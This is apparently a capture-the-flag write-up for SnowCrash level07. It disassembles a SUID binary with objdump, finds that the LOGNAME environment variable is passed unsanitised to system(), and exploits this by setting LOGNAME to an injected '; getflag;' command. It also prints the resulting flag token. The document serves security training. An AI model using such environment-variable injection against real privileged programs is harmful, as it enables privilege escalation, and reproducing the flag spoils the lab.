# LEVEL 07

## Summary

This level demonstrates a shell injection vulnerability in a SUID binary. By analyzing the binary with objdump, we discover it uses the value of the LOGNAME environment variable in a system call. Setting LOGNAME to a malicious value allows execution of arbitrary commands, enabling retrieval of the flag.

## Workflow

1. The directory `/home/user/level07` contains a single file: **level07** (a binary program). The binary has the SUID bit set and is owned by flag07. The goal is to infect it so it executes getflag command.
	```
	level07@SnowCrash:~$ ls -l
	total 12
	-rwsr-sr-x 1 flag07 level07 8805 Mar  5  2016 level07
	```

2. Use objdump to see what the binary does, it uses the env to get a variable value and puts it in a system call (shell injection vulnerability).
	```
	level07@SnowCrash:~$ objdump -M intel -D ./level07
	08048514 <main>:
	8048514:	55                   	push   ebp
	...
	804856f:	c7 04 24 80 86 04 08 	mov    DWORD PTR [esp],0x8048680
	8048576:	e8 85 fe ff ff       	call   8048400 <getenv@plt>
	804857b:	89 44 24 08          	mov    DWORD PTR [esp+0x8],eax
	804857f:	c7 44 24 04 88 86 04 	mov    DWORD PTR [esp+0x4],0x8048688
	8048586:	08 
	8048587:	8d 44 24 14          	lea    eax,[esp+0x14]
	804858b:	89 04 24             	mov    DWORD PTR [esp],eax
	804858e:	e8 ad fe ff ff       	call   8048440 <asprintf@plt>
	8048593:	8b 44 24 14          	mov    eax,DWORD PTR [esp+0x14]
	8048597:	89 04 24             	mov    DWORD PTR [esp],eax
	804859a:	e8 71 fe ff ff       	call   8048410 <system@plt>
	...
	```

3. Look at the string at 0x8048680 to see which env variable is used.
	```
	level07@SnowCrash:~$ objdump -s --start-address=0x8048680 --stop-address=0x8048687 ./level07

	./level07:     file format elf32-i386

	Contents of section .rodata:
	8048680 4c4f474e 414d45                      LOGNAME
	```

4. Execute the vulnerable program with a LOGNAME variable infected (shell injection).
	```
	level07@SnowCrash:~$ LOGNAME="; getflag;" ./level07

	Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
	```
